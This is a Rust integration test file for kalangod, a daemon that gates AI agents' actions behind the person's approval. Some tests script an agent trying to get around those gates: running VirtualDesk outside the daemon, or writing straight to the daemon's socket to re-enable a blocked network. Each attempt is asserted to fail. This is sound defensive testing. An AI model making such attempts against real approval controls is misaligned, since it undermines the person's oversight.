    let script = "import multiprocessing, concurrent.futures\nl = multiprocessing.Lock()\nwith concurrent.futures.ProcessPoolExecutor(2) as e:\n    print(sum(e.map(abs, [-1, -2])))\n";
    let r = c.call("tarefas.executar", json!({"programa": "/usr/bin/python3", "argumentos": ["-c", script], "pasta": d.area.join("Documentos")}));
    let v = &r["structuredContent"];
    if nix::unistd::geteuid().is_root() {
        assert_eq!(v["codigo"], 0, "{v}");
        assert_eq!(v["saida"], "3\n");
    } else {
        assert_ne!(v["codigo"], 0, "{v}");
        assert!(v["nota"].as_str().unwrap_or("").contains("/dev/shm"), "{v}");
    }
}


/// A grant's cache goes with the grant: the project folder taken out, its commands' cache is removed (the work
/// folders' own cache stays).
#[test]
fn a_grants_cache_goes_with_the_grant() {
    if !has_user_systemd() {
        eprintln!("sem systemd do usuário: teste pulado");
        return;
    }
    let d = start_startup();
    let mut c = Client::new(&d.sock);
    let h = &d.area;
    std::fs::create_dir_all(h.join("Projetos/site")).unwrap();
    let cache_of = |c: &mut Client, pasta: &Path| -> PathBuf {
        let r = c.call("tarefas.executar", json!({"programa": "sh", "argumentos": ["-c", "mkdir -p $GOCACHE/x && chmod 555 $GOCACHE/x && dirname $CARGO_HOME"], "pasta": pasta}));
        PathBuf::from(r["structuredContent"]["saida"].as_str().unwrap().trim())
    };
    // the work folders' grant, then the one with the project approved: two caches
    let docs = cache_of(&mut c, &h.join("Documentos"));
    let a = approve_next_always(d.sock.clone());
    assert_eq!(c.call("tarefas.pedir_pasta", json!({"pasta": "~/Projetos/site"}))["isError"], false);
    a.join().unwrap();
    let site = cache_of(&mut c, &h.join("Projetos/site"));
    assert_ne!(docs, site);
    assert!(docs.is_dir() && site.is_dir());
    let r = c.rpc("kalango/pastas_remover", json!({"caminho": "~/Projetos/site"}));
    assert_eq!(r["result"]["removida"], true, "{r}");
    assert_eq!(r["result"]["caches_removidos"], 1, "{r}");
    assert!(!site.exists(), "the grant's cache went with it (read-only folders in it too)");
    assert!(docs.is_dir(), "the work folders' cache stays");
}

/// An agent running Kalango VirtualDesk itself (`tarefas.executar`, inside the agents' slice), around kalangod and
/// without any of kalangod's variables: it can read the list, and nothing else — not start a machine, not change its
/// network or its microphone, not open the window. (Needs the user's systemd for the slice, and
/// KALANGO_TESTE_VIRTUALDESK / KALANGO_TESTE_VIRTUALDESK_MODELO as the test above.)
#[test]
fn an_agent_running_virtualdesk_itself_can_only_read() {
    let (Ok(vd), Ok(modelo)) = (std::env::var("KALANGO_TESTE_VIRTUALDESK"), std::env::var("KALANGO_TESTE_VIRTUALDESK_MODELO")) else {
        eprintln!("sem KALANGO_TESTE_VIRTUALDESK e KALANGO_TESTE_VIRTUALDESK_MODELO: pulado");
        return;
    };
    if !has_user_systemd() {
        eprintln!("sem systemd do usuário: teste pulado");
        return;
    }
    let d = start_with(false, "");
    // the machines inside the task's area (where an agent can reach); a copy of the template made by the person
    let maquinas = d.area.join("maquinas");
    assert!(Command::new("cp").args(["-r", "--reflink=auto", &modelo]).arg(&maquinas).status().unwrap().success());
    let template = std::fs::read_dir(&maquinas).unwrap().flatten().next().unwrap().file_name().to_string_lossy().to_string();
    let mj = maquinas.join(&template).join("machine.json");
    let before = std::fs::read_to_string(&mj).unwrap();
    // the program where an agent's command can run it (its own area), as a copy in ~/.local/bin would be
    let vd_here = d.area.join("kalango-virtualdesk");
    std::fs::copy(&vd, &vd_here).unwrap();
    let vd = vd_here.display().to_string();
    let mut c = Client::new(&d.sock);
    let run = |c: &mut Client, args: &str| {
        let cmd = format!("env KALANGO_VIRTUALDESK_DIR={} XDG_RUNTIME_DIR=/tmp/x {vd} {args}", maquinas.display());
        let r = c.call("tarefas.executar", json!({"programa": "sh", "argumentos": ["-c", cmd], "pasta": d.area}));
        r["structuredContent"]["saida"].as_str().unwrap_or("").to_string() + r["structuredContent"]["erros"].as_str().unwrap_or("")
    };
    let l = run(&mut c, "ferramenta vm.listar '{}'");
    assert!(l.contains(&template), "reading the list is fine: {l}");
    for args in [
        format!("ferramenta vm.ligar '{{\"id\":\"{template}\"}}'"),
        format!("ferramenta vm.ajustes '{{\"id\":\"{template}\",\"rede\":\"nat\",\"microfone\":true}}'"),
        format!("ferramenta vm.snapshot '{{\"id\":\"{template}\",\"acao\":\"voltar\",\"tag\":\"s1\"}}'"),
        format!("ferramenta vm.clonar '{{\"id\":\"{template}\",\"rede\":\"nat\"}}'"),
        "--testar-rede /tmp/kvd-x /dev/null".to_string(),
        String::new(),
    ] {
        let out = run(&mut c, &args);
        assert!(out.contains("kalangod"), "refused, pointing to kalangod's tools: {args}: {out}");
    }
    assert_eq!(std::fs::read_to_string(&mj).unwrap(), before, "the machine did not change");
    assert!(!std::fs::read_dir("/proc").unwrap().flatten().any(|e| {
        std::fs::read(e.path().join("cmdline")).is_ok_and(|c| String::from_utf8_lossy(&c).contains(&format!("process=kvd-{template}")))
    }), "nothing started");
    assert_eq!(std::fs::read_dir(&maquinas).unwrap().count(), 1, "no copy made");

    // and the networks kept off the agents are the person's to change, not an agent's
    c.rpc("kalango/redes_agentes", json!({"rede": "Celular de Ana", "permitir": false}));
    let py = format!(
        "import json,socket;s=socket.socket(socket.AF_UNIX);s.connect('{}');f=s.makefile('rw');f.write(json.dumps({{'jsonrpc':'2.0','id':1,'method':'kalango/redes_agentes','params':{{'rede':'Celular de Ana','permitir':True}}}})+'\\n');f.flush();print(f.readline())",
        d.sock.display()
    );
    let r = c.call("tarefas.executar", json!({"programa": "python3", "argumentos": ["-c", py], "pasta": d.area}));
    let out = r["structuredContent"].to_string();
    let l = c.rpc("kalango/redes_agentes", json!({}));
    assert_eq!(l["result"]["sem_agentes"], json!(["Celular de Ana"]), "an agent could not allow it: {out}");
}

/// Denies the next pending request from another process.
fn deny_next(sock: PathBuf) -> std::thread::JoinHandle<String> {
    std::thread::spawn(move || {
        for _ in 0..400 {
            let mut c = Client::new(&sock);
            let p = c.rpc("kalango/pendentes", json!({}));
            if let Some(id) = p["result"].as_array().and_then(|a| a.first()).and_then(|x| x["id"].as_u64()) {
                let out = Command::new(BIN).args(["negar", &id.to_string()]).env("KALANGOD_SOCKET", &sock).output().unwrap();
                return String::from_utf8_lossy(&out.stdout).into_owned() + &String::from_utf8_lossy(&out.stderr);
            }
            std::thread::sleep(Duration::from_millis(25));
        }
        "nenhum pedido".into()
    })
}

/// A GPU that can never go to a machine is refused at once, without asking the person (asking and then refusing
/// would waste their answer).
#[test]
fn an_impossible_gpu_reservation_does_not_ask() {
    let d = start();
    let mut c = Client::new(&d.sock);
    for addr in ["0000:ff:1f.7", "nao-e-endereco"] {
        let t0 = std::time::Instant::now();
        let r = c.call("gpu.vfio_reservar", json!({"endereco": addr}));
        assert_eq!(r["isError"], true, "{r}");
        assert!(t0.elapsed() < Duration::from_secs(5), "refused without waiting for an answer");
        let p = c.rpc("kalango/pendentes", json!({}));
        assert!(p["result"].as_array().unwrap().is_empty(), "nobody was asked: {p}");
    }
}

/// "Aprovar sozinho": the mark for the timeline is believed only from the agents' engine. Any other caller announcing
/// a perfectly valid approval (setting on, an eligible action, a high confidence) is not marked as approved by the d1.
#[test]
fn only_the_engine_can_announce_an_approval_by_the_d1() {
    let d = start_startup();
    let mut c = Client::new(&d.sock);
    let setting = d.area.join("cfg/kalango/agente-permissoes.json");
    std::fs::create_dir_all(setting.parent().unwrap()).unwrap();
    std::fs::write(&setting, r#"{"aprovacao_d1": {"ligada": true, "confianca": 60}}"#).unwrap();
    std::fs::create_dir_all(d.area.join("Documentos/pasta")).unwrap();
    let file = d.area.join("Documentos/pasta/a.txt");
    std::fs::write(&file, "x").unwrap();
    let args = json!({"caminho": file});
    let r = c.rpc("kalango/aprovado_d1", json!({"ferramenta": "arquivos.lixeira", "argumentos": args, "confianca": 99, "motivo": "trash"}));
    assert_eq!(r["result"]["registrado"], false, "{r}");
    assert_eq!(c.call("arquivos.lixeira", args)["isError"], false);
    let log = std::fs::read_to_string(d._dir.path().join("estado/linha-do-tempo.jsonl")).unwrap();
    assert!(log.contains("arquivos.lixeira") && !log.contains("\"d1\""), "{log}");
}

/// The internet tunnel is a door to the world: opening it always asks, with the exact text (what becomes reachable,
/// through whom, which triggers), the answer "always" is refused, and the Timeline records both the no and the yes.
#[test]
fn the_internet_tunnel_always_asks_with_the_exact_text_and_never_always() {
    let d = start_startup();
    let mut c = Client::new(&d.sock);
    let args = json!({"modo": "rapido", "provedor": "cloudflare", "porta": 40123, "ociosidade_s": 7200,
        "gatilhos": [{"id": "gi-1", "flow": "Receber pedidos", "signed": true, "level": "observar"}]});
    let h = answer_startup(d.sock.clone(), "negar");
    let r = c.call("tunel.autorizar", args.clone());
    let (req, always) = h.join().unwrap();
    assert_eq!(r["isError"], true, "{r}");
    assert_eq!(req["no_always"], true, "{req}");
    assert_eq!(req["tool"], "tunel.autorizar");
    let shown = req["reason"].as_str().unwrap_or_default().to_string();
    for must in ["Cloudflare", "trycloudflare.com", "40123", "Receber pedidos", "gi-1"] {
        assert!(shown.contains(must), "{must} missing in the approval text: {shown}");
    }
    assert!(!always.contains("aprovado"), "“always” must be refused: {always}");
    // the screen gets the card of the design: sentence, warning, the four rows, the footnote, “Open once”
    assert_eq!(req["cartao"]["tipo"], "internet", "{req}");
    assert_eq!(req["cartao"]["linhas"].as_array().unwrap().len(), 5, "address, type, level, signature and who asked");
    // (the daemon speaks the person's language: the button is “Open once” or “Abrir uma vez”)
    assert!(["Open once", "Abrir uma vez"].contains(&req["cartao"]["aprovar"].as_str().unwrap()), "{req}");
    assert!(req["cartao"]["frase"].as_str().unwrap().contains("Receber pedidos"));
    // yes: it goes ahead; asked again the next time (no "always" was kept)
    let h = answer_startup(d.sock.clone(), "aprovar");
    let r = c.call("tunel.autorizar", args.clone());
    h.join().unwrap();
    assert_eq!(r["isError"], false, "{r}");
    let h = answer_startup(d.sock.clone(), "negar");
    assert_eq!(c.call("tunel.autorizar", args)["isError"], true);
    h.join().unwrap();
    let regs = c.rpc("kalango/registros", json!({}))["result"]["registros"].as_array().unwrap().clone();
    let mine: Vec<&Value> = regs.iter().filter(|e| e["tool"] == "tunel.autorizar").collect();
    assert_eq!(mine.len(), 3, "the Timeline has every request: {regs:?}");
    // an invalid request is an error before anyone is asked
    let bad = c.call("tunel.autorizar", json!({"modo": "rapido", "provedor": "tailscale", "porta": 1}));
    assert_eq!(bad["isError"], true, "{bad}");
    // closing never asks (the service is not there in this test, so it fails — but it fails without a request)
    let close = c.call("tunel.fechar_todos", json!({}));
    assert_eq!(close["isError"], true);
    assert!(c.rpc("kalango/pendentes", json!({}))["result"].as_array().unwrap().is_empty());
}

/// An agent's internet trigger asked at a level above the lowest: the card offers “Only at the lowest”. That answer runs
/// the SAME request with the level rewritten to the lowest, once, and the Timeline says so; “Approve as asked” keeps the
/// level; a request that already asks for the lowest has no such answer.
#[test]
fn an_agents_internet_trigger_can_be_approved_only_at_the_lowest_level() {
    use std::os::unix::fs::PermissionsExt;
    let dir = tempfile::tempdir().unwrap();
    let log = dir.path().join("criado.log");
    let script = dir.path().join("kalango-fluxosd");
    std::fs::write(
        &script,
        format!(
            "#!/bin/sh\ncase \"$2\" in\n internet.trigger_preview) echo '{{\"result\":{{\"flow\":\"Contas a pagar\",\"signed\":true,\"level\":\"'\"$(echo \"$3\" | sed -n 's/.*\"max_level\":\"\\([a-z]*\\)\".*/\\1/p')\"'\",\"methods\":[\"POST\"],\"max_body_bytes\":65536,\"rate_per_minute\":30,\"content_types\":[\"application/json\"],\"respond\":{{\"mode\":\"accepted\"}},\"allow_ips\":[],\"max_pending\":20}}}}' ;;\n internet.trigger_create) echo \"$3\" >> '{}'; echo '{{\"result\":{{\"id\":\"gi-1\",\"path\":\"/h/x\",\"signed\":true,\"level\":\"observar\"}}}}' ;;\nesac\n",
            log.display()
        ),
    )
    .unwrap();
    std::fs::set_permissions(&script, std::fs::Permissions::from_mode(0o755)).unwrap();
    let d = start_startup_env(&[("KALANGO_FLUXOSD", script.to_str().unwrap())]);
    let mut c = Client::new(&d.sock);
    let ask = json!({"fluxo": "contas", "nivel": "usuario"});
    // “Only at the lowest”: the alternative answer (the protocol's second approving button)
    let h = answer_alternative(d.sock.clone());
    let r = c.call("gatilho_internet.criar", ask.clone());
    let (req, second) = h.join().unwrap();
    assert!(req["cartao"]["alternativa"].is_string(), "the card offers it: {req}");
    // (this reaches the guard only when the request is still waiting when the second answer comes, which a process cannot
    // time here: `approval::decision_tests::a_request_that_was_decided_cannot_be_decided_again` is the test that holds the
    // guard, deterministically; this asserts that, either way, the second answer is not taken)
    assert!(second.contains("decided") || second.contains("decidid"), "a second answer to the same request is refused, not taken: {second}");
    assert_eq!(r["isError"], false, "{r}");
    let made = std::fs::read_to_string(&log).unwrap();
    assert!(made.contains("\"max_level\":\"observar\"") && !made.contains("usuario"), "the trigger was made at the lowest level: {made}");
    // the facts of the card went with it, at the level it was made at
    assert!(made.contains("\"expected\":{") && made.contains("\"level\":\"observar\""), "the card's facts travel with the lowered run: {made}");
    let regs = c.rpc("kalango/registros", json!({}))["result"]["registros"].as_array().unwrap().clone();
    assert!(regs.iter().any(|e| e["tool"] == "gatilho_internet.criar" && e["status"] == "ok" && e["args"]["nivel"] == "usuario"), "the Timeline records the approval of the request as it was asked: {regs:?}");
    assert!(regs.iter().filter(|e| e["tool"] == "gatilho_internet.criar").count() >= 2, "and the run that followed: {regs:?}");
    // “Approve as asked”: the level stays
    std::fs::remove_file(&log).unwrap();
    let sock = d.sock.clone();
    let h = std::thread::spawn(move || {
        for _ in 0..400 {
            let p = Client::new(&sock).rpc("kalango/pendentes", json!({}));
            if let Some(req) = p["result"].as_array().and_then(|a| a.first()).cloned() {
                Command::new(BIN).args(["aprovar", &req["id"].as_u64().unwrap().to_string()]).env("KALANGOD_SOCKET", &sock).output().unwrap();
                return;
            }
            std::thread::sleep(Duration::from_millis(25));
        }
    });
    let r = c.call("gatilho_internet.criar", ask);
    h.join().unwrap();
    assert_eq!(r["isError"], false, "{r}");
    assert!(std::fs::read_to_string(&log).unwrap().contains("\"max_level\":\"usuario\""), "as asked, the level is the one asked");
    assert!(std::fs::read_to_string(&log).unwrap().contains("\"expected\":{"), "and the card's facts travel with it too");
    // the lowest asked: no alternative on the card
    let h = answer_startup(d.sock.clone(), "aprovar");
    c.call("gatilho_internet.criar", json!({"fluxo": "contas"}));
    let (req, always) = h.join().unwrap();
    assert!(req["cartao"]["alternativa"].is_null(), "{req}");
    assert!(!always.contains("aprovado"), "no “always” where there is no alternative: {always}");
}

/// Replacing the key and turning a trigger on show a card that says who asked (never "you"), and a denial changes nothing.
#[test]
fn turning_on_and_replacing_the_key_ask_with_a_card_that_says_who_asked() {
    use std::os::unix::fs::PermissionsExt;
    let dir = tempfile::tempdir().unwrap();
    let script = dir.path().join("kalango-fluxosd");
    std::fs::write(
        &script,
        "#!/bin/sh\ncase \"$2\" in\n internet.trigger_list) echo '{\"result\":[{\"id\":\"gi-1\",\"path\":\"/h/x\",\"signed\":true,\"level\":\"observar\",\"flow\":\"Contas\",\"methods\":[\"POST\"],\"max_body_bytes\":65536,\"rate_per_minute\":30,\"content_types\":[\"application/json\"],\"respond\":{\"mode\":\"accepted\"},\"allow_ips\":[],\"max_pending\":20,\"enabled\":false}]}' ;;\nesac\n",
    )
    .unwrap();
    std::fs::set_permissions(&script, std::fs::Permissions::from_mode(0o755)).unwrap();
    let d = start_startup_env(&[("KALANGO_FLUXOSD", script.to_str().unwrap())]);
    let mut c = Client::new(&d.sock);
    for (tool, args) in [("gatilho_internet.ativar", json!({"id": "gi-1"})), ("gatilho_internet.girar_segredo", json!({"id": "gi-1"}))] {
        let h = answer_startup(d.sock.clone(), "negar");
        let r = c.call(tool, args);
        let (req, _) = h.join().unwrap();
        assert_eq!(r["isError"], true, "{tool}: denied, so it did not run: {r}");
        assert_eq!(req["cartao"]["tipo"], "internet", "{tool}: {req}");
        let rows = req["cartao"]["linhas"].as_array().unwrap_or_else(|| panic!("{tool}: no rows in {req}"));
        let asked = rows.iter().find(|r| r[0] == "Asked by" || r[0] == "Pedido por").unwrap_or_else(|| panic!("{tool}: no row for who asked: {rows:?}"));
        // (“you” only when the caller is verified as the person's own interface: a test program is whatever the stand-in
        // configuration says; here it is enough that the row is there and says something)
        assert!(!asked[1].as_str().unwrap().is_empty(), "{tool}: {asked}");
    }
}
